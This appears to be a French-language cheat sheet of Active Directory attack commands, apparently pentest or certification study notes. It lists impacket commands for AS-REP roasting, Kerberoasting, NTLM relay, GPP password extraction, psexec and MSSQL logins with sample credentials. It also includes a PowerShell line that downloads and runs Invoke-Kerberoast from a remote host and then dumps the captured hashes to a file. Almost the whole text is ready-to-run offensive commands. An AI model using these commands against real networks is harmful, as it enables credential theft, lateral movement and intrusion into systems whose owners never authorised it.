Attaque AS-REP Roasting
```
impacket-GetNPUsers CORP/ -no-pass -usersfile users.txt
```

Attaque Kerberoasting
```
impacket-GetUserSPNs -request -dc-ip 192.168.200.18 CORP\JOHN_DOE:P455w0rd4567 -outfile kerberoasting.hashes
```

Attaque LLMNR
```
impacket-ntlmrelayx -tf ./smb_targets.txt -of netntlm -6 -w -smb2support -socks
```
Vérification de la présence ou non de la préauthentification Kerberos sur les utilisateurs
```
impacket-GetNPUsers CORP/ -no-pass -usersfile users.txt
```
Attaque des mots de passe stocké via les GPO
```
impacket-Get-GPPPassword 'CORP'/'JOHN_DOE':'P455sw0rd4567'@SFRDC2
```
Ecoute serveur
```
sudo impacket-smbserver -smb2support ATTACKERSHARE .
```


```
impacket-psexec Fiona.Clark:Summer2023@192.168.187.21
```

```
impacket-mssqlclient oscp/sql_svc:Dolphin1@10.10.187.148 -windows-auth

```

## Téléchargement du script  kerberoast
```powershell
IEX (New-Object System.Net.Webclient).DownloadString('http://192.118.10/Invoke-Kerberoast.ps1')
```


#### Invoke-Kerberoast
```
Invoke-Kerberoast -OutputFormat Hascat | Select-Object Hash | Out-File -filepath 'c:\users\public\hashCapture.txt' -Width 8000
```


```
```
